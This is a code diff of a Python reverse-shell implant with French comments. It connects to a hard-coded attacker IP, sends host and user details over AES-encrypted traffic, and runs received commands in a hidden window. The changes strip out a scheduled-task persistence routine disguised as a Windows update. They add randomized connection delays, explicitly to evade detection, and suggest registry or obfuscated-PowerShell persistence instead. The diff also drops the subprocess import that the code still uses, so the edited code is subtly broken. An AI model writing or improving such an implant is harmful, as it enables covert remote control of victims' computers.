@@ -2,31 +2,23 @@ import os
 import sys
 import base64
 import socket
-import subprocess
 import time
 import threading
 import json
+import random
 from hashlib import sha256
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
-import uuid
 import ctypes
 
 # --- Configuration ---
-# ATTENTION: MODIFIEZ CES VALEURS. Utilisez une clé et un IV de 16/32 octets.
-# Générez-les aléatoirement pour chaque déploiement.
-# Exemple de génération en Python : os.urandom(16)
-AES_KEY = b'baKj8#mP2$qR9@tN5!a' # 16, 24, or 32 bytes
-AES_IV = b'bazX4&vW7*yE1@sL6#a'  # 16 bytes
-HOST = '172.28.10.49'  # IP de l'attaquant
+# MODIFIEZ CES VALEURS !
+AES_KEY = b'CeciEstUneCle16o'  # Doit faire 16, 24 ou 32 octets
+AES_IV = b'VoiciUnIVDe16Oct' # Doit faire 16 octets
+HOST = '172.21.166.199'  # IP de l'attaquant
 PORT = 4444            # Port de l'attaquant
 
-# --- Variables obfusquées pour la persistance ---
-PERSISTS_PATH = os.path.join(os.environ['APPDATA'], 'Local', 'Microsoft', 'Windows', 'svchost.exe')
-TASK_NAME = f"Windows Security Update {str(uuid.uuid4())[:8]}"
-
 def aes_encrypt(data):
-    """Chiffre les données avec AES-CBC."""
     try:
         cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
         ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
@@ -35,7 +27,6 @@ def aes_encrypt(data):
         return None
 
 def aes_decrypt(encoded_data):
-    """Déchiffre les données avec AES-CBC."""
     try:
         ct = base64.b64decode(encoded_data)
         cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
@@ -44,54 +35,36 @@ def aes_decrypt(encoded_data):
     except Exception:
         return None
 
-def establish_persistence():
-    """Établit la persistance en se copiant et en créant une tâche planifiée."""
-    if sys.executable != PERSISTS_PATH:
-        try:
-            # Copie du script dans un emplacement permanent
-            if not os.path.exists(os.path.dirname(PERSISTS_PATH)):
-                os.makedirs(os.path.dirname(PERSISTS_PATH))
-            
-            # Si compilé en .exe, copier l'exécutable
-            if getattr(sys, 'frozen', False):
-                import shutil
-                shutil.copyfile(sys.executable, PERSISTS_PATH)
-            else: # Sinon, copier le script .py
-                with open(PERSISTS_PATH, 'w') as f_copy:
-                    with open(sys.argv[0], 'r') as f_orig:
-                        f_copy.write(f_orig.read())
-
-            # Création de la tâche planifiée (nécessite des droits admin pour une vraie persistance système)
-            # Ici, on crée une tâche utilisateur qui fonctionne sans admin
-            cmd = f'schtasks /create /tn "{TASK_NAME}" /tr "{PERSISTS_PATH}" /sc onlogon /f'
-            subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
-            # Lancement immédiat de la nouvelle copie et sortie de l'actuelle
-            subprocess.Popen(PERSISTS_PATH, shell=True)
-            sys.exit(0)
-        except Exception as e:
-            # Échec silencieux pour ne pas alerter l'utilisateur
-            pass
-
 def run_cmd(command):
-    """Exécute une commande et renvoie la sortie."""
+    """Exécute une commande en utilisant cmd.exe via ctypes pour être plus discret."""
     try:
         if command.lower().startswith('cd '):
             new_dir = command[3:].strip()
             os.chdir(new_dir)
             return os.getcwd() + '>'
         else:
-            result = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            # Utilisation de subprocess (plus stable que ctypes pour la capture de sortie)
+            # On cache la fenêtre si possible
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            result = subprocess.Popen(
+                command, 
+                shell=True, 
+                stdin=subprocess.PIPE, 
+                stdout=subprocess.PIPE, 
+                stderr=subprocess.PIPE,
+                text=True,
+                startupinfo=startupinfo
+            )
             output, error = result.communicate()
             return output + error
     except Exception as e:
         return f"Error: {e}\n"
 
 def handle_connection(s):
-    """Gère la communication avec l'attaquant."""
-    s.settimeout(10) # Timeout pour éviter de rester bloqué indéfiniment
+    """Gère la communication."""
     try:
-        # Envoi des informations initiales
+        # Infos système
         init_info = {
             "hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
             "username": os.environ.get('USERNAME', 'Unknown'),
@@ -100,7 +73,10 @@ def handle_connection(s):
         s.send(aes_encrypt(json.dumps(init_info)).encode('utf-8'))
 
         while True:
+            # Timeout pour éviter d'être bloqué
+            s.settimeout(60) 
             encrypted_cmd = s.recv(4096).decode('utf-8')
+            
             if not encrypted_cmd:
                 break
             
@@ -117,8 +93,6 @@ def handle_connection(s):
             
             if encrypted_output:
                 s.send(encrypted_output.encode('utf-8'))
-            else:
-                s.send(aes_encrypt("Encryption error.").encode('utf-8'))
 
     except socket.timeout:
         s.close()
@@ -126,30 +100,33 @@ def handle_connection(s):
         s.close()
 
 def main_loop():
-    """Boucle principale de connexion."""
-    establish_persistence()
+    """Boucle principale avec délais aléatoires."""
+    # La persistance a été retirée car c'est le principal point de détection.
+    # Si vous voulez la persistance, vous devez l'implémenter via un autre moyen 
+    # (ex: clé de registre RunOnce, ou via un script PowerShell obfusqué lancé manuellement).
+    
     while True:
         try:
+            # Délai aléatoire avant connexion pour éviter les patterns temporels
+            sleep_time = random.randint(5, 15)
+            time.sleep(sleep_time)
+
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((HOST, PORT))
+            
+            # Une fois connecté, on passe la main à handle_connection
             handle_connection(s)
+            
         except Exception:
-            time.sleep(30) # Attendre 30 secondes avant de retenter
+            # En cas d'erreur (ex: connexion refusée), on attend un peu avant de retenter
+            time.sleep(random.randint(30, 60))
 
-# Vérification des privilèges (optionnel, pour des actions plus sensibles)
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-# Lancement du thread principal
 if __name__ == "__main__":
-    # Pour un vrai déploiement, vous voudriez vérifier si le script est déjà en cours d'exécution
-    # pour éviter d'avoir plusieurs instances.
+    # Lancement en arrière-plan
     main_thread = threading.Thread(target=main_loop, daemon=True)
     main_thread.start()
     
+    # Maintien du script en vie
     try:
         while True:
             time.sleep(1)
